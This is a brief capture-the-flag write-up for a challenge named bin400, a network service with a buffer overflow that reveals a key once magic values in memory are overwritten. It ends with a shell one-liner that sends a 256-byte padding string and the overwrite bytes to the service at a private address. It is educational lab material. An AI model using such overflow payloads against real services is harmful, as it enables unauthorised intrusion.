## Overview

[bin400][1] is a network service has a buffer overflow vulnerability &mdash; it prints the key if some magic numbers are changed and otherwise prints itself.

## Writeup

After realizing that the question was terribly worded and the service was not available publicly, we finally connect to the service and are rewarded with a binary. Its quickly apparent we're supposed to overflow a buffer and change some magic value.

```
% cat &lt;(perl -e 'print "A"x256, "\x13\x0f\x17\x7f", "\x54\x4e\x4f\x44", "\x42\x7d\x3d\x5e", "\n"') - | tsocks nc 10.0.0.171 3490
